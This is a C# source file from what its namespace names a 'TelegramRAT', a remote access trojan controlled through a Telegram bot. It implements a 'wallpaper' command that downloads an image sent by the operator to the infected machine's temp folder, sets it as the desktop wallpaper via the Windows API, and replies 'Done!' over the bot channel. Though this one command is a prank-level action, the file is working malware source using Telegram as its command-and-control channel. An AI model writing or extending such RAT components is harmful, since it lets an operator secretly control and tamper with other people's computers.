using Telegram.Bot;
using TelegramRAT.Services;
using TelegramRAT.Utilities;

namespace TelegramRAT.Commands.Misc;

public class WallpaperCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "wallpaper";
    public override string[] Aliases => new[] { "wllppr" };
    public override string Description => "Change wallpapers. Don't forget to attach the image.";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            if (model.Files.Length == 0)
            {
                await botClient.SendMessage(model.Message.Chat.Id, "No image or file provided.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                return;
            }

            var telegramFile = await botClient.GetFile(model.Files.Last().FileId);
            string tempWallpaper = Path.Combine(fileSystemService.GetTempPath(), "wllppr.jpg");

            await using (var wallpapperImageFileStream = new FileStream(tempWallpaper, FileMode.Create, FileAccess.Write, FileShare.None, 4096, true))
            {
                if (telegramFile.FilePath != null)
                {
                    await botClient.DownloadFile(telegramFile.FilePath, wallpapperImageFileStream);
                }
            }

            winApiService.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, tempWallpaper, WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
            
            await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
